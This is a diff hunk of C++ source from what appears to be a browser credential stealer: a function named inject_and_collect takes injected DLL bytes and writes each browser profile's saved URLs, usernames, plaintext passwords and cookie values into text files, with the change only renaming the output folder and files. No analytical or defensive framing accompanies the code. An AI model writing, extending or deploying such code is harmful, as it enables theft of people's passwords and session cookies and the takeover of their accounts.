@@ -233,17 +233,17 @@ void inject_and_collect(const std::vector<unsigned char>& dll_bytes, const Brows
                         std::replace(p_name.begin(), p_name.end(), '\\', '_');
                         std::replace(p_name.begin(), p_name.end(), ':', '_');
 
-                        fs::path profile_dir = browser_dir / ("profile " + std::to_string(i + 1) + " - " + p_name);
+                        fs::path profile_dir = browser_dir / p_name;
                         fs::create_directories(profile_dir);
 
-                        std::string p_pass = (profile_dir / "password.txt").string();
+                        std::string p_pass = (profile_dir / "passwords.txt").string();
                         std::ofstream pass_file(p_pass);
                         for (auto& p : profiles[i]["passwords"]) {
                             pass_file << "URL: " << p["url"].get<std::string>() << "\nUser: " << p["username"].get<std::string>() << "\nPass: " << p["password"].get<std::string>() << "\n\n";
                         }
                         pass_file.close();
 
-                        std::string p_cook = (profile_dir / "cookie.txt").string();
+                        std::string p_cook = (profile_dir / "cookies.txt").string();
                         std::ofstream cookie_file(p_cook);
                         for (auto& c : profiles[i]["cookies"]) {
                             cookie_file << "Host: " << c["host"].get<std::string>() << " | Name: " << c["name"].get<std::string>() << " | Value: " << c["value"].get<std::string>() << "\n";
